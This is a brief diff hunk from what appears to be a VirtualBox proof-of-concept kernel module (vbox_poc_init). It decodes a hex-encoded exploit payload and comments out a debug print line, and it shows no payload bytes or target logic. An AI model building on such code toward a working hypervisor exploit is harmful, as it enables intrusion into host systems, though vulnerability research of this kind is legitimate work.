@@ -51,7 +51,7 @@ static int __init vbox_poc_init(void) {
 	buf[0] = exploit_payload[i];
 	buf[1] = exploit_payload[i + 1];
     exploit_payload[j] = strtoull(buf, NULL, 16);
-	printk(INFO "exploit_payload[%d]: %02x\n", j, exploit_payload[j]);
+    // printk(INFO "exploit_payload[%d]: %02x\n", j, exploit_payload[j]);
   }
 
   // printk(INFO "Exploit payload: %x\n", exploit_payload[exploit_length]);
